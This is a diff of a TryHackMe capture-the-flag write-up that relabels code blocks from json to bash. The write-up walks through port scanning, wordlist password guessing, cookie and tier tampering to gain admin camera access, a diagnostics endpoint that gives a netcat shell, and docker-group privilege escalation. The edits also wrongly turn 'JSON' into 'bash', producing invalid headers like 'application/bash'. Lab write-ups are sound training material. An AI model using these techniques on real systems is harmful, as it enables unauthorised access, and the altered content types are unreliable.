@@ -24,13 +24,13 @@ To identify open ports and exposed services, a full TCP port scan was performed 
 
 Command:
 
-```json
+```bash
 nmap -sT -p- -T5 -vvv 10.82.133.236
 ```
 
 Output:
 
-```json
+```bash
 PORT      STATE SERVICE    REASON
 22/tcp    open  ssh        syn-ack
 80/tcp    open  http       syn-ack
@@ -52,13 +52,13 @@ To further identify running services and versions, a targeted service scan was e
 
 Command:
 
-```json
+```bash
 nmap -sV -p 22,80,8000,8080,13400,13401,13402,13403,13404,21337 -T5 -vvv 10.82.133.236
 ```
 
 Output:
 
-```json
+```bash
 PORT      STATE SERVICE  REASON         VERSION
 22/tcp    open  ssh      syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
 80/tcp    open  http     syn-ack ttl 62 nginx 1.24.0 (Ubuntu)
@@ -80,7 +80,7 @@ Given the number of HTTP services, each web port was manually reviewed.
 
 Accessing **port 8080** revealed a login interface labeled:
 
-```json
+```bash
 **“HopSec Security Console”**
 ```
 
@@ -92,7 +92,7 @@ This appears to be a protected administrative or internal security portal requir
 
 Port **13400** hosted another login page titled:
 
-```json
+```bash
 **“HopSec Asylum – Facility Video Portal”**
 ```
 
@@ -149,7 +149,7 @@ A custom password dictionary was generated using OSINT-derived data such as the 
 
 Commands:
 
-```json
+```bash
 cupp -i
 
 First name: Guard
@@ -194,7 +194,7 @@ Accessing the this page we can see that we have access to live feed of multiple 
 
 Inspecting the page source revealed client-side logic controlling camera access:
 
-```json
+```bash
 async function handleCameraClick(cam){
   setActiveCamera(cam.id, cam.name || cam.desc);
   const isAdmin = (role === 'admin');
@@ -212,13 +212,13 @@ This logic indicates that access to the restricted camera feed depends entirely 
 
 Inspecting the browser cookies via the Developer Tools revealed the following entry:
 
-```json
+```bash
 hopsec_role: guard
 ```
 
 By modifying the cookie value from:
 
-```json
+```bash
 guard → admin
 ```
 
@@ -232,13 +232,13 @@ Refreshing the page, access to the previously restricted **Psych Ward Exit camer
 
 While monitoring traffic with Burp Suite, a `POST` request was identified when accessing a restricted (admin-tier) camera stream:
 
-```json
+```bash
 POST /v1/streams/request 
 ```
 
-The request included a JSON body specifying both the camera ID and access tier:
+The request included a bash body specifying both the camera ID and access tier:
 
-```json
+```bash
 {
   "camera_id": "cam-admin",
   "tier": "admin"
@@ -247,7 +247,7 @@ The request included a JSON body specifying both the camera ID and access tier:
 
 By appending `?tier=admin` to the URL and replaying the request with a non-admin user token, the server responded with:
 
-```json
+```bash
 {
   "effective_tier": "admin",
   "ticket_id": "5b141519-31ae-4b23-8e75-9137f72c4568"
@@ -266,7 +266,7 @@ GET /v1/streams/5b141519-31ae-4b23-8e75-9137f72c4568/manifest.m3u8
 
 The response was a valid **HLS playlist.**
 
-```json
+```bash
 HTTP/1.1 200 OK
 Server: Werkzeug/3.1.3 Python/3.12.3
 Date: Sun, 14 Dec 2025 22:17:40 GMT
@@ -300,7 +300,7 @@ Within the playlist, standard media segment paths (`.ts` files) were exposed. Do
 
 ![image.png](/assets/img/posts/tryhackme/aoc-2025/sq1/image%209.png)
 
-```json
+```bash
 Code: 115879
 ```
 
@@ -327,7 +327,7 @@ These endpoints hinted at **internal RTSP ingest diagnostics**.
 
 A `GET` request to `/v1/ingest/diagnostics` returned `405 Method Not Allowed`, revealing that the endpoint only accepted `POST`.
 
-```json
+```bash
 HTTP/1.1 405 METHOD NOT ALLOWED
 Server: Werkzeug/3.1.3 Python/3.12.3
 Date: Sun, 14 Dec 2025 22:59:38 GMT
@@ -355,16 +355,16 @@ After identifying the internal diagnostic endpoint exposed in the HLS manifest, 
 
 However, the server initially returned an error indicating that the **`rtsp_url` parameter was invalid**, as no request body had been provided.
 
-To resolve this, a valid RTSP URL was supplied in the JSON body of the request:
+To resolve this, a valid RTSP URL was supplied in the bash body of the request:
 
-```json
+```bash
 POST /v1/ingest/diagnostics HTTP/1.1
 Host: 10.80.173.124:13401
 Content-Length: 58
 Authorization: Bearer {"sub": "guard.hopkins@hopsecasylum.com", "role": "guard", "iat": 1765746887}.61a477c34a43658af9c00f0d9a7d7cb65bfdb46fb7a8b8aac75f5eca7a9ef9a7
 Accept-Language: en-US,en;q=0.9
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
-Content-Type: application/json
+Content-Type: application/bash
 Accept: */*
 Origin: http://10.80.173.124:13400
 Referer: http://10.80.173.124:13400/
@@ -379,11 +379,11 @@ Connection: keep-alive
 
 The server responded with `200 OK`, returning a **job identifier** and a **job status endpoint**, indicating that the diagnostic task was successfully created.
 
-```json
+```bash
 HTTP/1.1 200 OK
 Server: Werkzeug/3.1.3 Python/3.12.3
 Date: Sun, 14 Dec 2025 22:51:04 GMT
-Content-Type: application/json
+Content-Type: application/bash
 Content-Length: 118
 Location: /v1/ingest/jobs/5484680e-9ae4-4c33-b6ea-882280093ce8
 Access-Control-Allow-Origin: http://10.80.173.124:13400
@@ -398,7 +398,7 @@ Connection: close
 
 I then made a `GET` request to the job status endpoint provided in the previous response in order to monitor the diagnostic job execution.
 
-```json
+```bash
 GET /v1/ingest/jobs/b4ec25ab-944f-43ad-81bf-18755d627ed5 HTTP/1.1
 Host: 10.80.173.124:13401
 Authorization: Bearer {"sub": "guard.hopkins@hopsecasylum.com", "role": "guard", "iat": 1765746887}.61a477c34a43658af9c00f0d9a7d7cb65bfdb46fb7a8b8aac75f5eca7a9ef9a7
@@ -413,11 +413,11 @@ Connection: keep-alive
 
 The response indicated that the job had completed successfully and returned several important details, including a **console port** and a **token** associated with the `vendor-cam` RTSP stream.
 
-```json
+```bash
 HTTP/1.1 200 OK
 Server: Werkzeug/3.1.3 Python/3.12.3
 Date: Sun, 14 Dec 2025 22:51:39 GMT
-Content-Type: application/json
+Content-Type: application/bash
 Content-Length: 129
 Access-Control-Allow-Origin: http://10.80.173.124:13400
 Vary: Origin
@@ -431,13 +431,13 @@ Connection: close
 
 From the response, we obtained the following token:
 
-```json
+```bash
 e5a01cf9e0e94a9ca515a6a5d2037ce9
 ```
 
 The presence of the `console_port` suggested that an interactive service had been spawned as part of the diagnostic job. Using `netcat`, a connection was established to the specified port, and the token was supplied when prompted:
 
-```json
+```bash
 nc 10.80.173.124 13404
 e5a01cf9e0e94a9ca515a6a5d2037ce9
 svc_vidops@tryhackme-2404:~$ 
@@ -450,7 +450,7 @@ Once inside the system, a search of the filesystem revealed a file containing th
 
 This value represents the second half of the flag. When combined with the first part recovered earlier, the complete second flag is:
 
-```json
+```bash
 THM{REDACTED}
 ```
 
@@ -458,7 +458,7 @@ THM{REDACTED}
 
 After obtaining a shell, we verified our current privileges using the `id` command:
 
-```json
+```bash
 id
 uid=1500(svc_vidops) gid=1500(svc_vidops) groups=1500(svc_vidops)
 ```
@@ -467,20 +467,20 @@ This confirmed that we were running as the `svc_vidops` user.
 
 To identify potential privilege escalation vectors, we searched for binaries with the SUID bit set:
 
-```json
+```bash
 find / -type f -perm -04000 -ls 2>/dev/null
 ```
 
 Among the results, a non-standard binary stood out:
 
-```json
+```bash
 /usr/local/bin/diag_shell
 ```
 
 This binary is particularly interesting because it is **not a default system binary** and is located under `/usr/local/bin`, which often contains custom or internally developed tools.
 When executing the binary:
 
-```json
+```bash
 /usr/local/bin/diag_shell
 ```
 
@@ -493,13 +493,13 @@ This indicates that `diag_shell` has the **SUID bit set for the `dockermgr` user
 
 To identify services running on the target machine, we enumerated listening ports:
 
-```json
+```bash
 ss -tuln
 ```
 
 Output:
 
-```json
+```bash
 tcp LISTEN 0 4096 0.0.0.0:9001 0.0.0.0:*
 ```
 
@@ -509,7 +509,7 @@ Port **9001** is non‑standard and stood out from common services (SSH, HTTP, e
 
 We connected to the service using Netcat:
 
-```json
+```bash
 nc 127.0.0.1 9001
 ```
 
@@ -523,7 +523,7 @@ The prompt indicated that an authorization token from a previous part was requir
 
 Using **Flag 2**, authentication succeeded and granted access to the SCADA terminal.
 
-```json
+```bash
 [AUTH] Enter authorization token:
 THM{REDACTED}
 ```
@@ -548,7 +548,7 @@ The system hinted that unlocking the gate required a **numeric authorization cod
 
 Initial enumeration showed that the user `dockermgr` did not have root privileges and could not access protected directories such as `/root`:
 
-```json
+```bash
 cd /root
 Permission denied
 ```
@@ -557,7 +557,7 @@ Permission denied
 
 Further inspection revealed that the Docker socket was present and owned by the `docker` group
 
-```json
+```bash
 ls -l /var/run/docker.sock
 srw-rw---- 1 root docker /var/run/docker.sock
 ```
@@ -568,7 +568,7 @@ This is significant because **membership in the `docker` group effectively grant
 
 Checking group membership confirmed that `dockermgr` was listed as a member of the `docker` group:
 
-```json
+```bash
 getent group docker
 docker:x:998:ubuntu,dockermgr
 ```
@@ -579,13 +579,13 @@ However, this group membership was not active in the current shell session.
 
 To apply the group permissions without logging out, a new shell was spawned with the `docker` group as the effective group:
 
-```json
+```bash
 newgrp docker
 ```
 
 Verifying the identity showed that the active group had changed:
 
-```json
+```bash
 id
 uid=1501(dockermgr) gid=998(docker) groups=998(docker),1500(svc_vidops)
 ```
@@ -596,13 +596,13 @@ At this point, the user gained permission to interact with the Docker daemon.
 
 After gaining access to the Docker container, an interactive shell was spawned inside the running SCADA container:
 
-```json
+```bash
 docker exec -it asylum_gate_control /bin/sh
 ```
 
 Inside the container, the process was running as the user `scada_operator`, not as root. Direct access to `/root` was therefore still restricted:
 
-```json
+```bash
 cd /root
 /bin/sh: can't cd to root
 ```
@@ -611,7 +611,7 @@ cd /root
 
 Since the SCADA service was implemented in Python and the source files were readable, the next step was to inspect the application code directly:
 
-```json
+```bash
 sed -n '1,200p' /opt/scada/scada_terminal.py
 ```
 
@@ -655,7 +655,7 @@ After entering the three flags, the system confirmed that the challenge had been
 
 ![image.png](/assets/img/posts/tryhackme/aoc-2025/sq1/image%2016.png)
 
-```json
+```bash
 https://static-labs.tryhackme.cloud/apps/hoppers-invitation/
 ```
 
